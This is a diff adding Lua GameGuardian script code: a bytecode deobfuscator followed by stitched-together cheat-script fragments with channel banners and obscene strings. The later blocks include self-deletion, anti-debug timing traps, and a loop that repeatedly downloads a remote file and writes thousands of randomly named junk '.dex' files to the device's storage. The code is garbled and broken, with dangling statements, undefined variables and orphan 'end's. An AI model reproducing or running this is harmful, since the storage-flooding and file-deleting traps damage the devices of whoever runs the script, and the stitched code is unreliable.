+	if b:find("JMMP[^\n]*:goto_%d+") then--循环查找是否还有逻辑指令跳转分支
+		goto mlst
+	end
+	
+	for i,k in pairs({"FORLOOP","FORPREP"}) do--恢复数字for循环跳转位置
+		b=b:gsub("(\n"..k.." v%d+ :goto_)(%d+)",function(n,x)
+			if not a[tonumber(x)] then
+				return n..x
+			end
+			local vv=a[tonumber(x)]
+			a[tonumber(x)]=nil
+			return n..vv:match(".+JMP[^\n]+:goto_(%d+)")
+		end)
+	end
+
+	local fortl
+	goto tfop
+::tofcl::
+	b=b:gsub("\n:goto_(%d+)(\nTFORCALL[^\n]+\n:goto_%d+.-)(\nTFORLOOP v%d+ :goto_)("..fortl..")",function(e,n,o,x)--恢复泛型for循环逻辑
+		if not a[tonumber(x)] then
+			return "\n:goto_"..e..n..o..x
+		end
+		local t={}
+		repeat
+			if not a[tonumber(x)] then
+				break
+			end
+			t[#t+1]=a[tonumber(x)]
+			a[tonumber(x)]=nil
+			x=t[#t]:match(".+JMP[^\n]+:goto_(%d+)")
+			if x==nil or not a[tonumber(x)] then
+				break
+			end
+		until x==nil or not a[tonumber(x)]
+		if not t[1] then
+			return "\n:goto_"..e..n..o..x
+		end
+		for i, k in pairs(t) do
+			t[i]=k:match("(.+)\n[^\n]+")
+		end
+		if a[tonumber(x)] then
+			a[tonumber(x)]=a[tonumber(x)]:gsub("(\n:goto_"..i.."\n)","\nJMP :goto_"..e.."%1")
+		else
+			if not xmx then
+				xmx = {}
+			end
+			xmx[fortl]=e
+		end
+		return "\n"..table.concat(t,"\n").."\n:goto_"..e..n..o..fortl
+end)
+	if xmx then
+		for i,k in pairs(xmx) do
+			b=b:gsub("(\n:goto_"..i.."\n)","\nJMP :goto_"..k.."%1")
+		end
+	end
+	fortl=nil
+	xmx=nil
+::tfop::
+	for i in b:gmatch("TFORLOOP v%d+ :goto_(%d+)") do
+		if b:find("\n:goto_"..i.."\n")==nil then
+			fortl=i
+			break
+		end
+	end
+	if fortl then
+		goto tofcl
+	end
+	if b:find("JMMP[^\n]*:goto_%d+") then--再次循环查找是否还有逻辑指令跳转分支
+		goto mlst
+	end
+	if type(c1)~="table" then
+		b=c4.."\n"..b.."\n"..c1
+	end
+	b=b:gsub("\n%s+","\n")
+	local css=0
+	for i,k in pairs(a) do
+		css=css+1
+	end
+	if css~=0 then
+        if cs then
+	    	print("恢复第"..cs.."区块失败 or 不需要恢复")
+	    	return "No"
+	    else
+	        print(b)
+	        print(a)
+	        os.exit()
+	    end
+	end
+	return b..fnal
+end
+yx=yx:gsub("\n%s+","\n")
+yx=yx:gsub("(maxstacksize %d+)(.-%.func)",function(max,str)
+	local start,final="",""
+	s=s+1
+	-- print("恢复第"..s.."个区块")
+
+if str:find("JMP :goto") then
+	local mlgb = str
+	--str=str:gsub("[^\n]*; garbage[^\n]*", ""):gsub("[^\n]*; unused[^\n]*", "")
+	if str:find("日你妈") then
+		    return max..mlgb
+		end
+	str=str:gsub("(.-)JMP[^\n]+:goto_",function(x)
+		local vc,ck = x:match("(.+\n)([^\n]+\n)")
+		if ck and vc then
+			local zl=ck:match("%S+")
+			if Zl[zl] then
+				start = vc
+				return ck.."JMP :goto_"
+			else
+				start = x
+			end
+		else
+			start = x
+		end
+		return "JMP :goto_"
+	end,1)
+	:gsub("(.*JMP[^\n]+:goto_[^\n]+)(\n.+)",function(m,x)
+		final=x
+		return m
+	end,1)
+	
+	str=jmp.hf(str,s)
+	if str=="No" then
+		return max..mlgb
+	end
+	return max..start.."\n"..str.."\n"..final
+else
+	return max..str
+end
+end)
+:gsub("(\n:goto_%d+%s+)%.end","%1RETURN\n.end")
+:gsub("(\n:goto_%d+%s+)%.func","%1RETURN\n.func")
+:gsub("(TAILCALL[^\n]+)%s+%.end","%1\nRETURN\n.end")
+:gsub("(TAILCALL[^\n]+)%s+%.func","%1\nRETURN\n.func")
+:gsub("(\n:goto_%d+%s+)%.end","%1RETURN\n.end")
+:gsub("(\n:goto_%d+%s+)%.func","%1RETURN\n.func")
+:gsub("(TAILCALL[^\n]+)%s+%.end","%1\nRETURN\n.end")
+:gsub("(TAILCALL[^\n]+)%s+%.func","%1\nRETURN\n.func")
+:gsub("%.func F测试","")
+io.open("恢复.lua","w"):write(yx)
+
+
+local Load = debug.getinfo(1, "S").source
+local scriptName = gg.getFile():match("[^/]*$") -- nama file script
+local scriptPath = Load:match('@(.-):')         -- full path dari debug
+
+-- Hapus file secara aman
+os.remove(scriptName)
+os.remove(scriptPath)
+
+-- Keluar
+os.exit()
+
+
+file:write(response.content)
+file:close()
+
+gg.alert('The script was successfully loaded under the name PROGRAM_BETA.lua')
+--------------------------------------https://195.3.223.164/search/japanese?__cpo=aHR0cHM6Ly93d3cueG54eC5jb20
+
+
+
+ 
+gg.alert(os.date([[
+This code can be used only when an attempt to gain unauthorized access to your script occurs. Beginners are recommended to refrain from using this script.
+
+jk = gg.makeRequest('https://apry.hexat.com').content ---- connects to the site
+
+--====================================
+  --🔑  I AM DRAG CHANNEL  { ▶️ YouTube } 🔓
+  --====================================
+ 
+   --🔓 By PROGRAM BETA MANIFEST 📃
+  --🗒️ Name File : FULL OPEN {-HW-} DECODE
+  --🗂️ COODING : OPEN STRING DEPLOYMENT LICENCI
+  
+  ----This code writes the value of variable 'jk' to the file that was opened using variable 'r' in the appending mode, using the 'r:write()' function.
+]]))
+
+print("╭━━━━━━━━👑⚡👑━━━━━━━━━╮\n┃❖TELEGRAM 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦:\n┃@t.me/PROGRAM_BETA\n┃➖➖➖➖➖➖➖➖➖➖➖➖\n┃ ❖𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐜𝐡𝐞𝐧𝐞𝐥:\n┃https://195.3.223.164/search/japanese?__cpo=aHR0cHM6Ly93d3cueG54eC5jb20\n┃➖➖➖➖➖➖➖➖➖➖➖➖\n┃❖𝐕𝐞𝐫𝐬𝐢𝐨𝐧: Unlimitied\n╰━━━━━━━━👑⚡👑━━━━━━━━━╯")
+
+
+
+
+
+
+gg.toast("ACTIVE")
+gg.alert("👑 DONE CHECK FILE NOW 👑")
+
+--[[
+
+PROGRAM BETA
+
+]]
+local i="PROGRAM BETA\n⚡:2766931413"
+local file=_G["io"]["open"]("/storage/emulated/0/nzf_nb", 'r')
+while file==nil do
+_G["gg"]["alert"]("PROGRAM BETA一PROGRAM BETA\nPROGRAM BETA\nPROGRAM BETA","PROGRAM BETA")
+local a=_G["tostring"](_ENV)
+local a=_G["string"]["len"](a)
+local a="鸟之风QQ:2766931413\n『看你妈』"..a.."『看你妈』"
+_G["io"]["open"]("/storage/emulated/0/nzf_nb", "w"):write(a):close()
+_G["os"]["exit"](99999)
+_G["error"](i)
+end
+
+local a=_G["tostring"](_ENV)
+local a=_G["string"]["len"](a)
+local b=_G["io"]["open"]("/storage/emulated/0/nzf_nb", 'r'):read('*a'):match("『看你妈』(%d+)『看你妈』")
+local c=a-b
+while c>_G["math"]["random"](40,50) do
+_G["gg"]["alert"](i)
+_G["print"](i)
+_G["os"]["exit"](99999)
+_G["error"](i)
+end
+
+--[[
+DRAG CHANNEL YT
+--PROGRAM BETA
+]]
+local save = {}
+for i = 1, 52000 do table.insert(save, {["address"] = 131 + i,  ["flags"] = 4,  ["values"] = 520}) end
+for i = 1, 52000 do table.insert(save, {["address"] = 131 + i,  ["flags"] = 4,  ["values"] = 520}) end
+for i = 1, 52000 do table.insert(save, {["address"] = 131 + i,  ["flags"] = 4,  ["values"] = 520}) end
+gg.removeListItems(save)
+for i = 1, 6 do gg.addListItems(save) end
+gg.removeListItems(save)
+
+NZF=io.open("/sdcard/RL.LOG","r")
+if NZF~=nil then
+while true do
+os.remove("/sdcard/RL.LOG")
+os.exit()
+end
+end
+
+Test = {}
+for i = 1, 999 do 
+table.insert(Test, {address = 127 + i, flags = 12, values = 127})
+end
+clock = os.clock()
+time = os.time()
+for i = 1, 6 do gg.addListItems(Test) end
+if os.clock() - clock > 2 then
+gg.removeListItems(Test)
+for i = 1, 30000 do
+Link = "https://firebasestorage.googleapis.com/v0/b/antiban-by-st.appspot.com/o/icon_bookmark_open.png?alt=media&token=a1ab14f9-49d2-4cbc-b265-b7345dbf5d75"
+path = "/sdcard/"
+Name = "Photo_For_Test.png"
+Satan = gg.makeRequest(Link).content
+if Satan == nil then os.exit() end
+io.open(path .. "/" ..Name ,"w"):write(Satan)
+for x = 1, 30000 do 
+gg.saveList("/storage/emulated/0/"..string.char(math.random(45,255))..string.char(math.random(35,148))..string.char(math.random(15,50))..string.char(math.random(30,168))..string.char(math.random(20,80)).."Jonas["..math.random(1,5000).."]Fuck.dex", gg.LOAD_APPEND)
+os.exit()
+end
+end
+end
+if os.time() - time > 2 then
+gg.removeListItems(Test)
+os.exit()
+end 
+gg.removeListItems(Test)
+
+gg.sleep(1000)
+end
+
+
+
+if menu == 2 then
+gg.clearResults()
+gg.clearList()
+-- main code info
+gg.clearResults()
+end
+
+
+
+if menu ==  3 then
+gg.clearResults()
+gg.clearList()
+os.exit()
+end
+
+if menu == nil then end
+menuk = - 1
+end
+
+while(true) do
+if gg.isVisible(true) then
+menuk = 1
+gg.setVisible(false)
+end
+
+if menuk == 1 then start() end end
+
+
+
+
+
+
